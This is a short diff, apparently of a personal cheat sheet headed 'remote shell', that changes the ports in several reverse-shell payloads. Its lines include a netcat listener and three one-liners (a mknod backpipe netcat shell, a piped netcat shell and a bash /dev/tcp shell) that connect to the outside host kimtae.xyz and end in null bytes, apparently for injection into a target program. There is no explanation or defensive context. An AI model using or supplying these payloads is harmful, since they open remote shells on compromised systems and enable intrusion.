@@ -20,8 +20,9 @@ __
 
 
 __remote shell__
-nc -lvvp 9090 wait
-cmd = "mknod backpipe p; nc kimtae.xyz 8888 0<backpipe | /bin/bash 1>backpipe\x00"
-cmd = 'nc kimtae.xyz 8888 | /bin/sh | nc kimtae.xyz 8889\x00'
-cmd = "bash -c 'bash>&/dev/tcp/kimtae.xyz/8888 0>&1'\x00"
+nc -lvvp 9989 wait
+cmd = "mknod backpipe p; nc kimtae.xyz 9989 0<backpipe | /bin/bash 1>backpipe\x00"
+cmd = 'nc kimtae.xyz 8888 | /bin/sh | nc kimtae.xyz 9989\x00'
+cmd = "bash -c 'bash>&/dev/tcp/kimtae.xyz/9989 0>&1'\x00"
+9990
 __
